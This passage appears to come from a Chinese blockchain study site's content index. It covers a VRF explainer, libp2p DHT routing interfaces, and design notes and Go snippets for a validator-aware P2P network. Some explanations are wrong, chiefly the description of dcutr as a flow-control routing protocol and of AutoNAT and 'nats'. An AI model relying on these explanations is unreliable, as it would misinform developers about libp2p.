VRF、可验证随机函数、密码学、伪随机函数、签名\n引言\n在密码学领域，随机性是一个关键要素。许多密码学原语，如密钥生成、加密和签名，都依赖于随机数。然而，在某些应用场景中，仅仅生成随机数并不足够。在这些场景中，需要能够验证随机数的生成过程是公平和无偏的。这就是可验证随机函数（VRF）的概念应运而生。\nVRF是一种将密码学签名和伪随机函数相结合的技术，它可以生成随机数的同时生成一个证明，证明这个随机数是公平且无偏的。这使得VRF在区块链、密码学投票系统等领域具有广泛的应用价值。\nVRF基本原理\nVRF是一种特殊的伪随机函数，它有以下三个特性：\n\n唯一性：对于相同的输入，VRF的输出是唯一的。\n不可预测性：在不知道密钥的情况下，VRF的输出是不可预测的。\n可验证性：VRF的计算过程可以生成一个证明，该证明可以证明输出是由正确的密钥生成的，且没有偏差。\n\nVRF的工作原理可以分为以下几个步骤：\n\n密钥生成：生成一对密钥，包括公钥（PK）和私钥（SK）。公钥用于验证随机数的正确性，私钥用于生成随机数。\n计算VRF：使用私钥（SK）和输入（x）计算VRF值（y）和证明（π）。具体计算方法取决于所使用的VRF方案。\n验证：使用公钥（PK）、输入（x）、VRF值（y）和证明（π）进行验证。如果验证通过，则说明VRF值是公平且无偏的。\n\nVRF实现方法\n基于离散对数问题的VRF\n离散对数问题是密码学中一个经典的难题。基于离散对数问题的VRF使用了一种特殊的签名方案，如Schnorr签名或BLS签名。这类VRF的安全性依赖于离散对数问题的难解性。\n基于椭圆曲线密码学的VRF\n椭圆曲线密码学（ECC）是一种基于椭圆曲线数学的密码学方法。ECC具有较短的密钥长度和较高的安全性，因此在现代密码学应用中非常流行。基于ECC的VRF使用椭圆曲线上的点作为公钥和私钥，通过特定的椭圆曲线运算来计算VRF值和证明。\n基于lattice的VRF\nlattice（格）密码学是一种基于格数学的密码学方法。与其他密码学方法相比，lattice密码学在量子计算机攻击面前具有更高的安全性。基于lattice的VRF使用格上的向量作为密钥，通过复杂的格运算来实现VRF的计算和验证。\nVRF应用场景\n区块链共识算法\n在区块链领域，共识算法是用于解决去中心化网络中的信任问题的关键技术。VRF可以用于实现公平且去中心化的共识算法，如Algorand和Ouroboros等。通过使用VRF，可以确保参与者在区块链网络中的角色分配是公平且随机的。\n密码学投票系统\n在密码学投票系统中，为了确保投票过程的公平性和隐私性，可以使用VRF生成随机数作为加密投票的随机噪声。通过VRF证明，可以确保投票过程中随机噪声的生成是公平且无偏的，从而保证投票结果的真实性和可信度。\n隐私保护数据共享\n在数据共享场景中，为了保护用户隐私，可以使用VRF生成随机噪声对原始数据进行加密。通过这种方式，即使数据泄露，攻击者也无法从加密数据中还原出原始数据。同时，由于VRF的可验证性，数据接收方可以确保数据共享过程中的随机噪声生成是公平且无偏的，从而确保数据的真实性和可信度。\nVRF的安全性\nVRF的安全性主要取决于所使用的密码学方法和难解性假设。常见的安全性标准包括：\n\n计算不可区分性：在不知道私钥的情况下，攻击者无法区分VRF的输出与随机数。\n唯一性：对于同一输入，VRF的输出是唯一的。这可以防止攻击者生成多个有效证明来欺骗验证者。\n可验证性：验证者可以使用公钥快速验证VRF的证明，确保输出的随机数是公平且无偏的。\n\n为了满足这些安全性要求，VRF实现方案需要经过严格的密码学分析和安全性证明。\n总结\nVRF是一种密码学概念，将密码学签名和伪随机函数相结合，为随机数生成提供可验证性。VRF在区块链、密码学投票系统、隐私保护数据共享等领域具有广泛的应用价值。VRF的实现方法包括基于离散对数问题的VRF、基于椭圆曲线密码学的VRF和基于lattice的VRF等。为了保证VRF的安全性，实现方案需要经过严格的密码学分析和安全性证明。"},"blockchainguide/Public_Chain_Development/P2P_Network/libp2p源码分析/死磕libp2p之DHT路由":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/libp2p源码分析/死磕libp2p之DHT路由","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/libp2p源码分析/死磕libp2p之DHT路由.md","title":"死磕libp2p之DHT路由","links":[],"tags":[],"content":"接口定义\n//ContentRouting是间接寻址的值提供程序层。它用于查找有关谁拥有什么内容的信息。\n//内容由CID（内容标识符）标识，CID对哈希进行编码\n//以防将来使用。\ntype ContentRouting interface {\n\t// 将给定的cid添加到内容路由系统\n\tProvide(context.Context, cid.Cid, bool) error\n \n\t// 搜索能够提供给定key的peers\n\tFindProvidersAsync(context.Context, cid.Cid, int) &lt;-chan peer.AddrInfo\n}\ntype PeerRouting interface {\n\t// 搜索具有给定ID的peer，并返回相关地址信息\n\tFindPeer(context.Context, peer.ID) (peer.AddrInfo, error)\n}\ntype Routing interface {\n\tContentRouting // 内容路由\n\tPeerRouting    // 节点路由\n\tValueStore     // 基础存取接口\n\tBootstrap(context.Context) error // // 允许caller提示路由系统进入Boostrapped状态并保持在那里。它不是同步调用。\n}\ntype PubKeyFetcher interface {\n\t// GetPublicKey returns the public key for the given peer.\n\tGetPublicKey(context.Context, peer.ID) (ci.PubKey, error)\n}"},"blockchainguide/Public_Chain_Development/P2P_Network/p2p":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/p2p","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/p2p.md","title":"p2p","links":[],"tags":[],"content":"Q1 如何保证验证者节点之间的稳定连接，同时也能连接其他类型节点\n基于Role的DHT设计\n\n\n基于Role的哈希函数\n设计一个角色敏感的哈希函数，使得具有相同角色的节点在DHT空间中更有可能彼此靠近。例如，可以为验证节点和普通节点分别使用不同的哈希函数前缀\nfunc roleSensitiveHash(role Role, data []byte) []byte {\n    var prefix []byte\n    if role == ValidatorNode {\n        prefix = []byte(&quot;validator&quot;)\n    } else {\n        prefix = []byte(&quot;regular&quot;)\n    }\n \n    hashData := append(prefix, data...)\n    hash := sha256.Sum256(hashData)\n    return hash[:]\n}\n\n\n自定义节点发现策略\n// 自定义节点发现策略\n    discoveryOptions := []discovery.Option{\n        discovery.Filter(func(info *peer.AddrInfo) bool {\n            // 检查节点角色是否与当前节点匹配\n            return checkRoleMatch(info, nodeRole)\n        }),\n    }\n\n\n\n验证节点专属子网络\n\n\n创建子网络DHT 实例：\n为验证节点专属子网络创建一个单独的 DHT 实例。这个实例可以使用与主网络相同的 DHT 协议，但应该具有不同的网络标识符，以避免与主网络混淆。这可以通过为子网络 DHT 实例选择一个特殊的网络前缀来实现。\nvalidatorDHT, err := dht.New(ctx, validatorHost, dht.ProtocolPrefix(&quot;/validator-dht&quot;))\nif err != nil {\n    // 处理错误\n}\n\n\n验证节点加入子网络\n当一个验证节点加入网络时，它应首先加入主网络，然后尝试加入验证节点专属子网络。为此，验证节点需要知道其他验证节点的一些初始地址。这可以通过预先配置的引导节点列表或其他节点发现方法来实现\n// 加入主网络\nbootstrap(ctx, host, mainDHT)\n \n// 如果是验证节点，还要加入验证节点专属子网络\nif isValidator {\n    bootstrap(ctx, validatorHost, validatorDHT)\n}\n\n\n优先与子网络中的验证节点建立连接\n在验证节点子网络中，验证节点应优先与其他验证节点建立连接。这可以通过在子网络 DHT 中进行节点发现并尝试与找到的验证节点建立连接\nfunc connectToValidators(ctx context.Context, host host.Host, validatorDHT *dht.IpfsDHT) {\n    for {\n        // 查找子网络中的其他验证节点\n        peerChan, err := validatorDHT.FindPeers(ctx, &quot;validator-subnet&quot;)\n        if err != nil {\n            // 处理错误\n        }\n \n        // 尝试与找到的验证节点建立连接\n        for peer := range peerChan {\n            if peer.ID != host.ID() &amp;&amp; host.Network().Connectedness(peer.ID) != network.Connected {\n                _, err := host.Network().DialPeer(ctx, peer.ID)\n                if err != nil {\n                    // 处理错误\n                }\n            }\n        }\n \n        // 在下一轮查找之前等待一段时间\n        time.Sleep(time.Minute)\n    }\n}\n\n\n允许验证节点与普通节点建立连接：\n4.1 定义最大普通节点连接数\n为验证节点定义一个最大普通节点连接数。这个值可以根据您的需求进行调整，以控制验证节点与普通节点之间的连接数量。\n4.2 定期查找普通节点：\n验证节点应定期在主网络 DHT 中查找普通节点。为了避免与其他验证节点建立连接，验证节点应首先检查找到的节点的角色，然后仅连接到普通节点\nfunc findRegularNodes(ctx context.Context, dht *dht.IpfsDHT) (&lt;-chan peer.AddrInfo, error) {\n    peerChan, err := dht.FindPeers(ctx, &quot;regular-nodes&quot;)\n    if err != nil {\n        return nil, err\n    }\n \n    filteredChan := make(chan peer.AddrInfo)\n    go func() {\n        defer close(filteredChan)\n        for peer := range peerChan {\n            role, err := getPeerRole(ctx, dht, peer.ID)\n            if err == nil &amp;&amp; role == RegularNode {\n                filteredChan &lt;- peer\n            }\n        }\n    }()\n \n    return filteredChan, nil\n}\n4.3 维护与普通节点的连接\n验证节点需要维护与普通节点的连接。当连接数低于最大普通节点连接数时，验证节点应尝试与新的普通节点建立连接。如果连接数超过最大值，验证节点可以断开一些连接，以便与其他普通节点建立连接。\nfunc maintainRegularConnections(ctx context.Context, host host.Host, dht *dht.IpfsDHT) {\n    for {\n        regularNodes, err := findRegularNodes(ctx, dht)\n        if err != nil {\n            // 处理错误\n        }\n \n        regularConnections := 0\n        for peer := range regularNodes {\n            if host.Network().Connectedness(peer.ID) == network.Connected {\n                regularConnections++\n            } else if regularConnections &lt; maxRegularConnections {\n                _, err := host.Network().DialPeer(ctx, peer.ID)\n                if err != nil {\n                    // 处理错误\n                } else {\n                    regularConnections++\n                }\n            }\n        }\n \n        // 在下一轮查找之前等待一段时间\n        time.Sleep(time.Minute)\n    }\n}\n\n"},"blockchainguide/Public_Chain_Development/P2P_Network/p2p/P2P网络设计":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/P2P网络设计","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/P2P网络设计.md","title":"P2P网络设计","links":[],"tags":[],"content":"节点角色\n\n验证节点\n普通节点\n\n✅\n网络拓扑\n为了让共识消息能够非常迅速的流转，同时保证共识网络的稳定，设计如下：\n\n最多连接50个节点✅\nvalidator最多连接30个✅\n假如validator不足30个，也可以连接普通节点，同时，假如连接已经50个了，新增的节点如果是validator,同时validator节点不足30个，就替换普通节点✅\nvalidator节点要在同一个子网里，普通节点在主网里，但也能保证普通节点可以跟验证者节点连接（这个至少需要两个DHT实例） ❎\n支持节点启动指定bootstrap ❎\n\n节点发现机制\n\n支持客户端模式：少资源受限设备开销\n\n连接管理策略\n\n使用基于角色的连接策略，让验证者节点之间的连接拥有最高的优先级✅\n验证节点之间最大连接数30，总连接数为50，当验证节点之间连接不足30，总连接数为50时候，如果连接的是验证节点，则替换普通节点  ✅\n自定义刷新路由表间隔 go-libp2p默认5分钟  ❎\n\n保持路由表中的节点信息是最新的。在一个动态的P2P网络中，节点可能会不断加入和离开。定期刷新路由表可以确保路由表中的节点信息是最新的。\n维持与活跃节点的连接。通过定期刷新路由表，节点可以确保它与活跃节点保持连接，提高网络的稳定性。\n提高路由效率。路由表中的过时节点可能会导致路由效率降低，因为查找请求可能需要经过更多的跳数才能到达目标节点。定期刷新路由表有助于消除这些过时节点，从而提高路由效率。\n\n\n\ndcutr协议支持\nnoise协议支持\n✅\nTLS协议支持\n✅\nNat穿透支持\n\n自动NAT✅\n穿透中继(circuit relay)  ❎\n\n传输协议支持\n\ntcp\nudp\nquic\n\n多种协议的监听地址支持 ✅\n消息广播策略\n消息类型\n\n共识消息\n\npreprepare消息\nprepare消息\ncommit消息\n\n\n同步消息\n\n同步区块体\n同步区块头\n\n\n广播消息\n\n广播区块消息\n广播区块头消息\n广播交易消息\n\n\n\n消息广播策略\n对于共识消息，采用gossipsub来处理，以确保大量验证节点可以及时的收到消息\n对于同步消息，采用多路复用流来传输，以保证可靠性\n对于矿工和交易池的广播消息也是通过gossipsub来处理\n消息转发策略\n\n首先由p2p模块接收到消息，再根据消息类型转发到不同模块（比如共识模块和同步模块和矿工模块）去处理，根据处理结果判断是否断开连接\n对于这几种消息，需要设置消息优先级，需要考虑是否设置了优先级，则不会执行低优先级的消息\n为减少网络负载，需要设置消息转发最大次数，此最大次数如何设置是个问题\n设置消息缓存，当自己已经转发过一条已知消息时，将不再转发\n使用流量控制策略，如令牌桶算法，确保节点间数据传输的稳定性\n设计重传机制，保证消息的传输\n\n消息发送策略\n\np2p层面会定义一个handler接口，用来处理消息，其他的模块应该实现这个接口\np2p层面会定义消息对应的处理器，每个处理器会调用属于自己模块的消息处理逻辑\np2p层面需要封装一个统一的消息结构，从而根据消息类型来解码对应的消息\n\n设计模式\n\n单例模式创建Host  ✅\n通过观察者模式来让各个模块处理自己关心的消息\n\n\n# P2P 网络代码架构设计\n \n## 1. 节点模块 (Node Module)\n- 使用工厂模式创建节点\n- 使用策略模式处理验证节点和普通节点的不同行为\n \n## 2. 网络拓扑模块 (Network Topology Module)\n- 使用观察者模式让验证者子网和主网相互通知状态变化\n- 使用组合模式构建网络拓扑结构\n \n## 3. 连接管理模块 (Connection Management Module)\n- 使用策略模式实现不同连接策略\n- 使用状态模式管理连接数和路由表刷新状态\n \n## 4. 通信协议模块 (Communication Protocols Module)\n- 使用适配器模式实现不同协议之间的转换\n- 使用装饰器模式为协议添加 NAT 穿透功能\n \n## 5. 传输协议模块 (Transport Protocols Module)\n- 使用抽象工厂模式创建传输协议实例\n- 使用桥接模式将传输协议与节点通信解耦\n \n## 6. 消息广播模块 (Message Broadcast Module)\n- 使用模板方法模式定义消息广播流程\n- 使用访问者模式处理不同类型的消息\n \n## 7. 消息处理模块 (Message Processing Module)\n- 使用责任链模式处理消息优先级和转发限制\n- 使用备忘录模式实现消息缓存\n- 使用流量控制策略如令牌桶算法，并使用适配器模式与消息处理模块集成\n- 使用命令模式实现重传机制\n在这个代码架构设计中，我们使用了一些常见的设计模式来降低耦合和提高可扩展性：\n\n\n节点模块使用工厂模式创建节点，策略模式处理验证节点和普通节点的不同行为。\n\n\n网络拓扑模块使用观察者模式实现验证者子网和主网之间的通知，组合模式构建网络拓扑结构。\n\n\n连接管理模块使用策略模式实现不同连接策略，状态模式管理连接数和路由表刷新状态。\n\n\n通信协议模块使用适配器模式实现不同协议之间的转换，装饰器模式为协议添加 NAT 穿透功能。\n\n\n传输协议模块使用抽象工厂模式创建传输协议实例，桥接模式将传输协议与节点通信解耦。\n\n\n消息广播模块使用模板方法模式定义消息广播流程，访问者模式处理不同类型的消息。\n\n\n消息处理模块使用责任链模式处理消息优先级和转发限制，备忘录模式实现消息缓存。流量控制策略如令牌桶算法可使用适配器模式与消息处理模块集成。此外，命令模式可以实现重传机制。\n\n\n这个代码架构设计将功能分为几个主要模块，以实现低耦合性和高可扩展性。通过使用合适的设计模式，您可以确保每个模块可以独立地进行修改和扩展，同时保持整体架构的稳定性。\n以下是一个简要的模块关系概述，以帮助您更好地理解各个模块之间的相互作用：\n\n节点模块负责创建和管理节点实例，包括验证节点和普通节点。\n网络拓扑模块维护了验证者子网和主网之间的关系，以及节点之间的连接信息。\n连接管理模块负责根据节点角色和连接策略建立和管理连接。\n通信协议模块处理不同通信协议之间的兼容性，包括 dcutr 协议、noise 协议和 NAT 穿透支持。\n传输协议模块负责实现不同的传输协议，如 TCP、UDP 和 QUIC。\n消息广播模块负责处理和广播各种类型的消息，如共识消息、同步消息和广播消息。\n消息处理模块对接收到的消息进行处理，包括优先级管理、转发次数限制、消息缓存、流量控制和重传机制等。\n\n根据这个架构设计，您可以在 go-libp2p 库的基础上构建您的 P2P 网络。通过将功能划分为不同的模块并使用设计模式降低耦合，您可以确保代码易于维护和扩展。\ngraph LR;\n    A(节点管理模块)--&gt;B(验证者管理模块);\n    A(节点管理模块)--&gt;C(协议支持模块);\n    A(节点管理模块)--&gt;D(传输协议模块);\n    A(节点管理模块)--&gt;E(广播管理模块);\n    A(节点管理模块)--&gt;F(任务调度模块);\n    A(节点管理模块)--&gt;G(共识模块);\n    B(验证者管理模块)--&gt;E(广播管理模块);\n    B(验证者管理模块)--&gt;F(任务调度模块);\n    C(协议支持模块)--&gt;D(传输协议模块);\n    D(传输协议模块)--&gt;E(广播管理模块);\n    E(广播管理模块)--&gt;F(任务调度模块);\n    F(任务调度模块)--&gt;G(共识模块);\n    F(任务调度模块)--&gt;A(节点管理模块);\n\nP2P网络详解\n创建网络\n\n创建host  options\n创建节点\n\n单例创建host 对象\n\n\n订阅网络事件  TODO 网络事件可能有很多，具体的\n初始化gossipsub功能  TODO 订阅主题什么时候做\n初始化了streamhandler功能，这个里面设计了转发器，会将流消息请求到指定protocolID 的处理器 TODO，没有初始化有哪些协议，没有实现相关的handler\n初始化自定义连接管理器   TODO 不确定是否在这个位置写\n\n启动网络\n\n启动节点\n\n启动监听\n连接到boot node\n\n\n\n"},"blockchainguide/Public_Chain_Development/P2P_Network/p2p/关于P2P网络的一些设计想法":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/关于P2P网络的一些设计想法","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/关于P2P网络的一些设计想法.md","title":"关于P2P网络的一些设计想法","links":[],"tags":[],"content":"\n\n需要设置与本节点连接的数目，一般20-25\n\n\n种子节点，一般是将所有已知网络地址配置为种子节点\n\n\n节点连接淘汰策略（1 Random, 2 FIFO, 3 LIFO）\n\n\nTLS 认证配置\n\n\n黑名单和白名单的设置\n\n\n消息发送的一个优先级设置，比如说共识消息优先（0-10级）\n\n\n大消息体拆包，组包（将消息体拆解成256个小包，再组合）\n\n\n支持的一般协议包括，TCP，QUIC\n\n\n需要支持多连接复用并行发送（与每个节点建立多个连接，可以发送多个消息）\n\n\n中继转发\n\n\n\n在这种场景下，如果不采用Relay或者NAT穿透功能的话，虽然node1和node2之间可以建立连接，但是node1与node3，node1与node4之间并不能打通进行直接通信。当我们启用中继功能，配置中继地址的话，就可以通过node2作为媒介，将node1&lt;—&gt;node3，node1&lt;—&gt;node4建立。具体配置如下\n\nnAT穿透\n传输层之上运用加密协议noise\n支持多路复用协议yamux\n业务层协议\n\n区块同步协议\ngossip\n交易协议\n\n\nmdns启用\nkad协议\n\n\n++++++++++++++++++++\nnetwork\n\n支持节点之间进行连接\n支持节点ping pong\n支持节点互连\n支持节点发现\n支持bootnode节点\n\n连接管理\n\n两种节点角色，后期可以扩展，目前就是验证节点和普通节点\n添加连接，当连接满50的时候，要求添加优先级高的连接\n最大连接50\n删除连接\n如果连接关闭，则从连接映射表中删除连接\n要将上述的功能嵌入到Network().Notify中\n支持每10分钟刷新路由表，替换普通节点为验证节点\n支持不同的多路复用流处理\n支持验证节点之间通过yamux 传递共识消息，普通节点之间只能传输同步区块消息\n\n各种对象关系\n\n主机之间可以建立连接\n主机之间建立连接的方式有多种，支持tcp ,udp,quic ,所以要求主机在不同类型的地址上监听\n网络实例， 一个连接就可以看作一个网络实例\n连接和流之间的关系\n\n1个连接可以多个流，每个流对应一个协议ID，但是一个流只能属于一个连接\n通常做法使用流来传输应用层协议，而不是直接使用连接\n\n\nmplex 和yamux 的用法以及分别有什么用\nwebRTC的支持 （主要是隐私性和安全性）\n\n程序逻辑\n\n启动host\n创建conn manager\n创建stream handler\n注册stream handler\n注册 广播消息处理器\n启动conn manager\n启动stream manger\n注册连接处理事件通知\n\n还差bootstraps\n节点发现\n和消息发布订阅\npubsub 处理共识消息\ngossipsub 处理同步消息\npubsub或者gossipsub用来处理共识消息，广播区块交易消息\n同步消息使用多路复用流来处理， 涉及到交互，并不需要大量gossip\n交易的广播可以使用gossipsub进行传播，但如果想要确保交易在网络中的可靠传输，使用数据流可能更好。数据流可以提供双向通信，并能够确保每个交易的到达和确认，这在需要进行一些协商和交互的情况下特别有用，例如交易池的维护和交易验证等。此外，使用数据流还可以实现更复杂的交易处理逻辑，例如可以将交易按照优先级或其他规则进行排序和选择处理。因此，在一些对交易的可靠传输和处理有更高要求的场景下，使用数据流可能更适合\n需要限制每个节点转发的消息数量 PeerScoreParams\n可以在建立连接时就创建好多路复用流并保存在连接信息中，然后在发送共识消息时直接使用已有的多路复用流。这样可以减少重复创建流的开销\n多路复用流还可以通过优先级来选择处理哪些流，从而实现更加灵活的流控制，最好加上时间戳，来保证流不会只处理优先级高的\nnoise协议可以用于建立安全的点对点通信连接。当两个节点尝试建立连接时，它们会交换各自的公钥，并使用这些公钥来生成一个共享密钥。然后，它们会使用这个共享密钥来加密所有传输的数据，并确保只有授权的节点可以解密和访问这些数据。\n在使用libp2p构建应用程序时，可以通过使用noise协议来确保节点之间的安全通信，防止中间人攻击和其他安全问题，TLS协议实际适合在联盟链，那种web server client 模式中\ndcutr是一种基于流量控制和拓扑感知的流量路由协议，可以在libp2p网络中实现高效的数据传输。\n在传统的p2p网络中，节点通常采用无差别的转发策略，即任何接收到的数据都会被立即转发给其他节点。这种策略容易导致网络拥塞和资源浪费，影响网络的性能和稳定性。\n而dcutr则可以根据网络拓扑结构和节点的资源状况来动态调整流量路由，实现有效的流量控制和拓扑感知。具体来说，dcutr可以通过以下几个步骤实现：\n拓扑感知：节点会定期向其他节点发送PING消息，以获取节点之间的拓扑关系和网络状况信息。\n流量控制：节点会根据接收到的PING消息和自身的资源状况，决定是否接收和转发数据。\n动态路由：节点可以根据接收到的PING消息和流量控制信息，动态调整数据传输的路由路径，以避免网络拥塞和资源浪费。\n总的来说，dcutr可以优化节点之间的数据传输，提高网络性能和稳定性，特别适用于高流量和高负载的场景。\nnats和auto nat都是libp2p提供的NAT穿透的解决方案。\n区别在于，nats需要一个外部的NATS服务器来协助进行NAT穿透，而auto nat则是使用一种称为“UPnP”（Universal Plug and Play）的协议来自动穿透NAT。当您使用auto nat时，libp2p将自动检测您所连接的网络，并尝试在网络设备上自动打开端口以进行通信。 如果UPnP不可用，则自动尝试NAT穿透。\n总体来说，如果您使用的网络设备支持UPnP，则使用auto nat会更简单和方便。如果您没有UPnP，或者您的网络环境比较复杂，则使用nats可能更可靠一些。\nautoNAT 会尝试使用一系列的 NAT 穿透技巧来穿透 NAT，包括 UPnP、NAT-PMP 和 Port Control Protocol (PCP)。不过，并不是所有的 NAT 设备都支持这些穿透技巧，autoNAT 也无法穿透一些特定的网络环境，比如 CGNAT（Carrier-Grade NAT）等，所以不能保证 100% 成功。如果需要更稳定的 NAT 穿透，可以使用 libp2p 中的 Circuit Relay 服务， 默认情况下，realy\n应用协议管理\n节点信息管理\n连接管理\n数据流管理\n组播  pubsub 订阅\n节点发现\n节点路由\n节点中继\n节点nat\n安全传输 tcp udp quic\n网络设计目标\n节点发现与连接管理\n节点发现与连接管理：\n使用libp2p中的Peerstore存储已知的节点信息，包括节点ID、公钥、地址等。\n使用libp2p中的Discovery模块进行节点发现。可以使用Bootstrap节点，MDNS发现或其他发现协议如Kademlia DHT自身的节点发现功能。\n设计连接管理策略，如根据节点性能、延迟、信誉等指标选择对等节点进行连接。可以使用libp2p中的ConnManager进行连接管理。\n传输协议管理：\n使用libp2p中的多种传输协议，如TCP、UDP、QUIC等。可以使用libp2p的Transport接口进行传输协议的封装和管理。\n实现传输协议升级和协商机制，允许节点在连接时协商最佳的传输协议。\n使用流多路复用技术，如Yamux或Mplex，允许在单个连接上进行多个并发数据流。\n路由表刷新机制：\n设计周期性的路由表刷新机制，以保持路由表的最新状态。可以使用Kademlia DHT中的桶刷新算法。\n设计节点剔除策略，如根据节点活跃度、信誉等指标剔除不活跃或恶意节点。\n数据传输与消息广播：\n使用libp2p中的PubSub系统进行消息广播。可以选择Gossipsub或Floodsub作为PubSub实现。\n使用libp2p的Bitswap协议进行点对点数据传输，允许节点之间直接请求和共享数据。\n安全性与隐私：\n使用libp2p中的Noise或TLS协议实现安全传输层。\n根据需要实现隐私功能，如加密通信、匿名路由等。\n最大连接数和资源管理：\n设计最大连接数限制，防止节点资源耗尽。可以在ConnManager中实现此功能。\n使用流量控制策略，如令牌桶算法，确保节点间数据传输的稳定性。\n设计资源管理策略，如内存、CPU使用率限制，防止节点资源耗尽\n网络拥塞与延迟：在P2P网络中，由于节点数量的增加，可能会出现网络拥塞和延迟问题。\n解决方法：\n优化路由算法，选择最佳路径进行数据传输。\n引入激励机制，鼓励节点提供更多带宽资源。\n实现自适应流量控制策略，根据网络条件动态调整传输速率。\n不稳定节点：由于P2P网络中的节点可能随时加入或离开网络，节点的稳定性可能会受到影响。\n解决方法：\n引入节点评级机制，根据节点的稳定性、性能和信誉等指标为节点评级。\n优先与高评级节点建立连接，提高网络稳定性。\n节点隔离：在P2P网络中，可能会出现部分节点被隔离的情况，导致网络分裂。\n解决方法：\n引入多种节点发现机制，增加节点互联的可能性。\n设计自愈算法，当检测到网络分裂时，自动触发网络修复操作。\n恶意节点：P2P网络中可能存在恶意节点，试图攻击网络或进行欺诈行为。\n解决方法：\n引入节点信誉体系，记录节点的行为并为其评分。\n对恶意节点采取惩罚措施，如降低其评分或将其踢出网络。\n加强安全机制，防止恶意节点篡改数据或发起攻击。\n数据一致性：在P2P网络中，需要确保所有节点间的数据一致性。\n解决方法：\n使用分布式哈希表（DHT）或其他分布式存储技术来存储和同步数据。\n设计有效的数据同步和校验机制，确保节点间的数据一致性。\n可扩展性：随着节点数量的增加，P2P网络的可扩展性可能会受到挑战。\n解决方法：\n引入分片技术，将网络划分为多个子网络，提高整体处理能力和扩展性。\n优化路由算法，提高网络搜索和数据传输的效率。\n网络拓扑优化：\n设计层次化的网络拓扑结构，将节点划分为不同层次，如超级节点、普通节点等。\n超级节点可以负责维护网络的稳定性、存储关键数据和协调其他节点。\n普通节点可以负责处理局部数据和参与局部共识。\n设计拓扑优化算法，如节点聚类、最小生成树等，以提高网络传输效率。\n网络编码技术：\n引入网络编码技术，如Fountain Codes、Random Linear Network Coding等，以提高数据传输的鲁棒性和效率。\n网络编码可以将数据分片并添加冗余信息，使得接收者可以从   部分数据片段中恢复原始数据，从而降低数据丢失的影响。\n网络监控与分析：\n设计网络监控与分析工具，实时收集网络中的各种指标，如节点状态、连接数、带宽使用率、延迟等。\n使用数据可视化技术，将收集到的指标展示为图表，便于分析和诊断网络问题。\n设计自动告警机制，当网络出现异常时，自动触发告警通知相关人员。\n跨链互操作性：\n为了实现不同P2P网络之间的互操作性，可以设计跨链通信协议，使得不同网络中的节点可以互相传输数据和共享资源。\n跨链通信协议可以基于现有的跨链技术，如Cosmos、Polkadot等，或者根据实际需求开发新的跨链协议。\n应用层协议设计：\n在P2P网络的基础上，可以设计各种应用层协议来满足不同应用场景的需求，如文件传输协议、实时通信协议等。\n应用层协议需要考虑数据的可靠性、实时性、安全性等因素，以满足不同应用的需求。\n容错与恢复机制：\n设计容错与恢复机制，以应对网络中的各种故障，如节点宕机、数据丢失等。\n容错机制可以包括数据备份、故障检测、故障隔离等。\n恢复机制可以包括数据恢复、节点重启、网络重组等。\n跨层次网路通信设计\n设计跨层次通信协议的目标是实现普通节点和验证节点之间的高效通信。以下是一个基于这个目标的详细跨层次通信协议设计：\n协议结构：\n定义一个模块化的协议结构，将协议分为不同的子协议以处理不同类型的通信需求。例如，可以设计子协议来处理交易传播、状态同步、共识消息等。\n消息格式：\n设计一种通用的消息格式，以便在普通节点和验证节点之间传输各种类型的数据。消息格式应具有以下特性：\n可扩展：支持添加新的消息类型和字段，以满足未来需求。\n紧凑：尽量减小消息大小，以降低网络传输开销。\n可读：易于解析和处理，同时具有一定的自描述能力。\n可以考虑使用现有的序列化格式，如Protocol Buffers、MessagePack等，或者设计自定义的消息格式。\n传输层协议选择：\n选择合适的传输层协议，以满足跨层次通信的性能和可靠性需求。可能的选择包括：\nTCP：提供可靠的数据传输，适用于需要确保数据完整性的场景，如状态同步。\nUDP：提供低延迟的数据传输，适用于实时通信场景，如共识消息传播。\n可以根据实际需求选择单一传输层协议，或者同时使用多种协议。\n身份验证和安全通信：\n为了确保通信安全，需要在普通节点和验证节点之间建立身份验证和安全通信机制。可以采用以下方法：\n使用公钥基础设施（PKI）对节点进行身份验证。\n使用安全的传输层协议，如TLS，以加密通信数据并防止窃听和篡改。\n数据同步策略：\n设计数据同步策略，以便普通节点和验证节点能够高效地同步状态和交易数据。可能的策略包括：\n增量同步：仅同步自上次同步以来的新数据，以减小传输开销。\n分片同步：将数据划分为多个片段，并允许节点仅同步感兴趣的片段。\n延迟同步：对于低优先级的数据，可以延迟同步以减轻网络负载。\n负载均衡和路由优化：\n实现负载均衡和路由优化机制以确保跨层次通信的高效性和可靠性。以下是一些可能的方法：\n多路径传输：\n使用多路径传输技术（如MPTCP），允许普通节点和验证节点通过多个网络路径并行传输数据。这可以提高通信的吞吐量和容错性。\n节点选择和连接管理：\n设计智能节点选择策略，使普通节点优先连接到性能良好、信誉高的验证节点。同时，实现连接管理机制，动态调整连接数量和质量，以优化通信性能。\n消息广播策略：\n设计消息广播策略，以实现快速、可靠的消息传播。例如，可以使用随机行走（Random Walk）或者环状波浪（Ripple）算法等策略，根据网络拓扑和节点性能调整消息传播路径。\n消息缓存和重传机制：\n为了确保消息的可靠传输，实现消息缓存和重传机制。例如，节点可以在收到确认消息之前缓存已发送的消息，并在消息丢失或超时时进行重传。\n消息优先级和排队策略：\n根据消息的类型和紧急程度，为消息分配优先级，并实现相应的排队策略。例如，可以优先传输共识消息和高价值交易，而将低优先级的状态同步请求延迟处理。\n流量控制和拥塞避免：\n实现流量控制和拥塞避免机制，以确保通信的稳定性和高效性。例如，可以使用滑动窗口（Sliding Window）或者令牌桶（Token 